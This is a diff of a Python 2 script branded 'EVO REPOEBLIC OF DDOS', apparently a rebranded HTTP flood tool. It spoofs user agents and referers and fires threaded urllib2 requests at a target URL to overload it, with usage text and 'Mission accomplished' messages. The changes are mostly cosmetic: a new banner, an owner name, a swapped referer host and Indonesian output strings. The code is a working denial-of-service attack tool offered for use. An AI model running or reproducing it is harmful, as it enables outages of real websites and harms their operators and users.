@@ -1,10 +1,13 @@
+# EVO REPOEBLIC OF DDOS
+# Kaka-Zy 17022004
+
 import urllib2
 import sys
 import threading
 import random
 import re
 
-#global params
+# global params
 url=''
 host=''
 headers_useragents=[]
@@ -46,12 +49,11 @@ def useragent_list():
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('https://zona-bucin.repl.co')
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
-#builds random ascii string
+# builds random ascii string
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
@@ -59,36 +61,31 @@ def buildblock(size):
 		out_str += chr(a)
 	return(out_str)
 
+import time
+import socket
+import random
+import sys
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python evo.py <url>'
-	print 'evo repoeblic of ddos'
-	print "\a"
-print \
+    print "\033[1;91m-?- EVO REPOEBLIC OF DDOS -?-\033[1;32m"
+    print \
 """
-::::::::::::::::::::::::::::::::::::::::::::::::::::::
-::                                                  ::
-::         -?-  EVO REPOEBLIC OF DDOS  -?-          ::
-::                                                  ::
-::                                                  ::
-::            ::::::::::    ::        ::            ::
-::                   ::      ::      ::             ::
-::                  ::        ::    ::              ::
-::                 ::          ::  ::               ::
-::                ::            ::::                ::
-::               ::              ::                 ::
-::              ::               ::                 ::
-::             ::                ::                 ::
-::            ::::::::::         ::                 ::
-::                                                  ::
-::                                                  ::
-::::::::::::::::::::::::::::::::::::::::::::::::::::::
-
+<!--
+  /////////////////////////////////////////
+  ////////////////////////////////////////
+  //                                  ///
+  //       MADE WITH KAKA ZY         ///
+  //     EVO REPOEBLIC OF DDOS      ///
+  //                               ///
+  ///////////////////////////////////
+  /////////////REPOFDDOS////////////
+  /////////////////////////////////
+-->
 """
-print '---------------------------------------------------'
+    print "\033[1;91mUSAGE: python2 evo.py " "<url>"
+    print "\033[1;91mOWNER: Kaka-Zy"
+    print "\033[1;91m<Port 80 With 65000 Packets for 99999>"
 
-	
-#http request
+# http request
 def httpcall(url):
 	useragent_list()
 	referer_list()
@@ -108,12 +105,12 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
-			#print e.code
+			# print e.code
 			set_flag(1)
- 			print 'Flooding WebSite Port 80 with 65000-byte packets for 99999'
+ 			print 'Mission accomplished!!'
 			code=500
 	except urllib2.URLError, e:
-			#print e.reason
+			# print e.reason
 			sys.exit()
 	else:
 			inc_counter()
@@ -121,7 +118,7 @@ def httpcall(url):
 	return(code)		
 
 	
-#http caller thread 
+# http caller thread 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
@@ -138,12 +135,12 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Shots sends Senting" % (request_counter)
+				print "%d Tembakan mengirim Paket!!" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n -M60 Hits are secced"
+			print "\n -M60 Hit dipisahkan"
 
-#execute 
+# execute 
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -152,7 +149,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Flooding WebSite Port 80 with 65000-byte packets for 99999 By DDoS Attack"
+		print "Flooding the Website!!       harap tunggu :)"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
